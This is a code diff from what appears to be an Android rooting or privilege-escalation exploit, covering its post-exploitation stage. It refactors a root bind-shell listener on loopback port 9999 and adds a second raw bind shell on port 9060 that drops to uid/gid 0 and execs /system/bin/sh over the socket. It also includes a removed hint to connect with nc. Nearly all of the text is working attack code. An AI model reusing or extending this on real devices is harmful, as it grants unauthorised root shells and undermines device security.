@@ -207,6 +207,32 @@ static void serve_bind_client(int cs) {
   close(master);
 }
 
+static void serve_bind_client_raw(int cs) {
+  setresgid(0, 0, 0);
+  setresuid(0, 0, 0);
+  dup2(cs, 0); dup2(cs, 1); dup2(cs, 2);
+  if (cs > 2) close(cs);
+  set_shell_ctx();
+  execl("/system/bin/sh", "sh", (char *)NULL);
+  _exit(127);
+}
+
+#define BIND_SHELL_PORT 9999
+#define LM_SHELL_PORT   9060
+
+static int make_bind_listener(int port) {
+  int ls = socket(AF_INET, SOCK_STREAM, 0);
+  if (ls < 0) return -1;
+  int one = 1; setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
+  struct sockaddr_in a; memset(&a, 0, sizeof(a));
+  a.sin_family = AF_INET; a.sin_port = htons(port);
+  a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+  if (bind(ls, (void *)&a, sizeof(a)) != 0 || listen(ls, 4) != 0) {
+    close(ls); return -1;
+  }
+  return ls;
+}
+
 static int selinux_permissive(void) {
   char v[8]; read_first_line("/sys/fs/selinux/enforce", v, sizeof(v)); return v[0] == '0';
 }
@@ -298,26 +324,33 @@ static void root_child_main(void) {
           if (install_embedded_su(&sud))
             pr_success("Su daemon ready pid=%d, type su for a root shell\n", sud);
           else
-            pr_warning("Su install failed errno=%d, use nc 127.0.0.1 9999\n",
-                       errno); }
+            pr_warning("Su install failed errno=%d, use the bind shell on port %d\n",
+                       errno, BIND_SHELL_PORT); }
 
-        int ls = socket(AF_INET, SOCK_STREAM, 0);
-        int one = 1; setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
-        struct sockaddr_in a; memset(&a, 0, sizeof(a));
-        a.sin_family = AF_INET; a.sin_port = htons(9999);
-        a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
-        if (ls >= 0 && bind(ls, (void *)&a, sizeof(a)) == 0 && listen(ls, 4) == 0) {
+        int ls_pty = make_bind_listener(BIND_SHELL_PORT);
+        int ls_lm = make_bind_listener(LM_SHELL_PORT);
+        if (ls_pty >= 0 || ls_lm >= 0) {
           write_shell_rc();
           signal(SIGCHLD, SIG_IGN);
           for (;;) {
-            int cs = accept(ls, NULL, NULL);
-            if (cs < 0) continue;
-            if (fork() == 0) {
-              close(ls);
-              serve_bind_client(cs);
-              _exit(0);
+            struct pollfd pf[2];
+            pf[0].fd = ls_pty; pf[0].events = POLLIN; pf[0].revents = 0;
+            pf[1].fd = ls_lm;  pf[1].events = POLLIN; pf[1].revents = 0;
+            if (poll(pf, 2, -1) <= 0) continue;
+            for (int k = 0; k < 2; k++) {
+              if (!(pf[k].revents & POLLIN)) continue;
+              int cs = accept(pf[k].fd, NULL, NULL);
+              if (cs < 0) continue;
+              int raw = (pf[k].fd == ls_lm);
+              if (fork() == 0) {
+                if (ls_pty >= 0) close(ls_pty);
+                if (ls_lm >= 0) close(ls_lm);
+                if (raw) serve_bind_client_raw(cs);
+                else serve_bind_client(cs);
+                _exit(0);
+              }
+              close(cs);
             }
-            close(cs);
           }
         }
         for (;;) pause();
